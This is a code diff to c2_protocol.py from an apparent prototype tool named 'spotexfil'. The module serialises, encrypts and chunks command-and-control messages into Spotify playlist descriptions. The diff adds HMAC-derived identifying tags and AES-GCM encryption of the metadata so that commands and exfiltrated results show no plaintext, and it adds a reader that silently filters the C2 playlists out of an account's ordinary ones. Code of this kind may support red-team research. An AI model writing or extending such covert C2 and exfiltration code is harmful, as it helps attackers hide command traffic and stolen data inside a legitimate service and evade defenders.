@@ -1,15 +1,21 @@
 """c2_protocol.py - C2 message serialization, encoding, and chunking.
 
 Adapts the existing Subcipher encryption pipeline for in-memory
-JSON messages. Handles command and result encoding, chunking for
-playlist descriptions, and reassembly.
+JSON messages. All playlist descriptions are fully encrypted —
+no plaintext metadata is exposed.
 
-Message flow:
-    dict -> JSON -> compress -> BLAKE2b -> AES-GCM -> Base64 -> chunks
+Playlist description format:
+    <c2_tag_12hex> + <base64(AES-GCM(meta+chunk))>
+
+The c2_tag is an HMAC-derived identifier that allows fast filtering
+without decrypting every playlist on the account.
 """
 
 import base64
+import hashlib
+import hmac
 import json
+import os
 import time
 
 from encoding import Subcipher, compute_blake2b
@@ -19,13 +25,123 @@ __author__ = '@sourcefrenchy'
 __email__ = 'jmamblat@icloud.com'
 __status__ = 'PROTOTYPE'
 
-# Channel discriminators embedded in playlist metadata
+# Channel discriminators (encrypted inside payloads, never plaintext)
 CHANNEL_CMD = "cmd"
 CHANNEL_RES = "res"
 
-# Metadata overhead: MARKER_SEP + {"c":"cmd","i":999,"seq":999} ~ 35 chars
-C2_META_OVERHEAD = 40
-C2_EFFECTIVE_CHUNK = CHUNK_SIZE - C2_META_OVERHEAD
+# C2 tag length (hex chars prepended to description for identification)
+C2_TAG_LEN = 12
+
+# Encrypted description overhead: c2_tag(12) + base64(nonce(12) +
+# AES-GCM(json_envelope + tag(16))). Empirically: 305 chars of data
+# produce a 512-char description with max metadata.
+C2_EFFECTIVE_CHUNK = 300  # conservative, fits within 512-char limit
+
+
+def compute_c2_tag(encryption_key: str) -> str:
+    """Derive a 12-char hex tag from the encryption key.
+
+    Used to identify C2 playlists without decrypting every playlist.
+    Opaque without the key — looks like random hex.
+
+    Args:
+        encryption_key: Shared passphrase.
+
+    Returns:
+        12-character hex string.
+    """
+    h = hmac.new(
+        encryption_key.encode('utf-8'),
+        b"spotexfil-c2-tag",
+        hashlib.sha256,
+    )
+    return h.hexdigest()[:C2_TAG_LEN]
+
+
+def _derive_meta_key(encryption_key: str) -> bytes:
+    """Derive a fast AES key for metadata encryption.
+
+    Uses HMAC instead of PBKDF2 to avoid per-playlist KDF cost.
+
+    Args:
+        encryption_key: Shared passphrase.
+
+    Returns:
+        32-byte AES key.
+    """
+    h = hmac.new(
+        encryption_key.encode('utf-8'),
+        b"spotexfil-c2-meta-key",
+        hashlib.sha256,
+    )
+    return h.digest()
+
+
+def _encrypt_chunk_desc(meta: dict, chunk_data: str,
+                        encryption_key: str) -> str:
+    """Encrypt metadata + chunk data into a playlist description.
+
+    Format: c2_tag(12 hex) + base64(AES-GCM(json({meta, data})))
+
+    Args:
+        meta: Metadata dict with c, i, seq fields.
+        chunk_data: The Base64 payload chunk.
+        encryption_key: Shared passphrase.
+
+    Returns:
+        Encrypted description string that fits in CHUNK_SIZE.
+    """
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+    tag = compute_c2_tag(encryption_key)
+    key = _derive_meta_key(encryption_key)
+
+    envelope = json.dumps(
+        {"m": meta, "d": chunk_data},
+        separators=(',', ':'),
+    ).encode('utf-8')
+
+    nonce = os.urandom(12)
+    aesgcm = AESGCM(key)
+    ciphertext = aesgcm.encrypt(nonce, envelope, None)
+
+    encrypted_b64 = base64.b64encode(nonce + ciphertext).decode('utf-8')
+    return tag + encrypted_b64
+
+
+def _decrypt_chunk_desc(description: str,
+                        encryption_key: str) -> tuple:
+    """Decrypt a playlist description to extract metadata and chunk.
+
+    Args:
+        description: Encrypted description (tag + encrypted b64).
+        encryption_key: Shared passphrase.
+
+    Returns:
+        Tuple of (metadata_dict, chunk_data_str).
+
+    Raises:
+        ValueError: If tag doesn't match or decryption fails.
+    """
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+
+    expected_tag = compute_c2_tag(encryption_key)
+    actual_tag = description[:C2_TAG_LEN]
+    if actual_tag != expected_tag:
+        raise ValueError("C2 tag mismatch")
+
+    encrypted_b64 = description[C2_TAG_LEN:]
+    raw = base64.b64decode(encrypted_b64)
+
+    nonce = raw[:12]
+    ciphertext = raw[12:]
+
+    key = _derive_meta_key(encryption_key)
+    aesgcm = AESGCM(key)
+    plaintext = aesgcm.decrypt(nonce, ciphertext, None)
+
+    envelope = json.loads(plaintext.decode('utf-8'))
+    return envelope["m"], envelope["d"]
 
 
 class C2Message:
@@ -149,38 +265,80 @@ def decode_message(b64_payload: str, encryption_key: str) -> dict:
 
 
 def chunk_payload(b64_payload: str, seq: int,
-                  channel: str) -> list:
-    """Split encoded payload into playlist-sized chunks with metadata.
+                  channel: str, encryption_key: str) -> list:
+    """Split encoded payload into fully encrypted playlist descriptions.
 
-    Each chunk + MARKER_SEP + metadata fits within CHUNK_SIZE.
+    Each description = c2_tag + encrypted(metadata + chunk_data).
+    No plaintext metadata is exposed.
 
     Args:
         b64_payload: Base64-encoded encrypted payload.
         seq: Sequence number for this message.
         channel: Channel discriminator (CHANNEL_CMD or CHANNEL_RES).
+        encryption_key: Passphrase for metadata encryption.
 
     Returns:
-        List of (chunk_data, metadata_json_str) tuples.
+        List of encrypted description strings.
     """
-    chunks = []
+    descriptions = []
     if len(b64_payload) <= C2_EFFECTIVE_CHUNK:
-        meta = json.dumps(
-            {"c": channel, "i": 1, "seq": seq},
-            separators=(',', ':'),
-        )
-        chunks.append((b64_payload, meta))
+        meta = {"c": channel, "i": 1, "seq": seq}
+        desc = _encrypt_chunk_desc(meta, b64_payload, encryption_key)
+        descriptions.append(desc)
     else:
         parts = [
             b64_payload[i:i + C2_EFFECTIVE_CHUNK]
             for i in range(0, len(b64_payload), C2_EFFECTIVE_CHUNK)
         ]
         for idx, part in enumerate(parts, start=1):
-            meta = json.dumps(
-                {"c": channel, "i": idx, "seq": seq},
-                separators=(',', ':'),
-            )
-            chunks.append((part, meta))
-    return chunks
+            meta = {"c": channel, "i": idx, "seq": seq}
+            desc = _encrypt_chunk_desc(meta, part, encryption_key)
+            descriptions.append(desc)
+    return descriptions
+
+
+def read_c2_descriptions(descriptions: list,
+                         encryption_key: str,
+                         channel: str = None,
+                         seq: int = None) -> dict:
+    """Decrypt and filter C2 playlist descriptions.
+
+    Attempts to decrypt each description. Non-C2 playlists or
+    wrong-key descriptions are silently skipped.
+
+    Args:
+        descriptions: List of (playlist_id, raw_description) tuples.
+        encryption_key: Passphrase for decryption.
+        channel: If set, filter by this channel.
+        seq: If set, filter by this sequence number.
+
+    Returns:
+        Dict mapping seq -> list of (chunk_data, metadata_dict) tuples.
+    """
+    tag = compute_c2_tag(encryption_key)
+    seq_groups = {}
+
+    for pl_id, desc in descriptions:
+        # Fast tag check (no decryption needed)
+        if not desc.startswith(tag):
+            continue
+
+        try:
+            meta, chunk_data = _decrypt_chunk_desc(desc, encryption_key)
+        except Exception:
+            continue
+
+        if channel and meta.get('c') != channel:
+            continue
+        msg_seq = meta.get('seq')
+        if seq is not None and msg_seq != seq:
+            continue
+
+        if msg_seq not in seq_groups:
+            seq_groups[msg_seq] = []
+        seq_groups[msg_seq].append((chunk_data, meta))
+
+    return seq_groups
 
 
 def reassemble_payload(chunk_metas: list) -> str:
